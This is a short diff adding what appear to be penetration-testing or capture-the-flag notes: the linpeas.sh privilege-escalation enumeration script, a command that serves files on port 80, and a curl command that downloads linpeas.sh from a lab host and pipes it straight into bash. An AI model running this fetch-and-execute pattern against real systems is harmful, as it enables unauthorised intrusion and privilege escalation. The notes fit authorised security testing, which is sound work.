@@ -1,0 +1,4 @@
+Tools
+linpeas.sh
+sudo python3 -m http.server 80
+curl http://10.10.14.24/linpeas.sh | bash
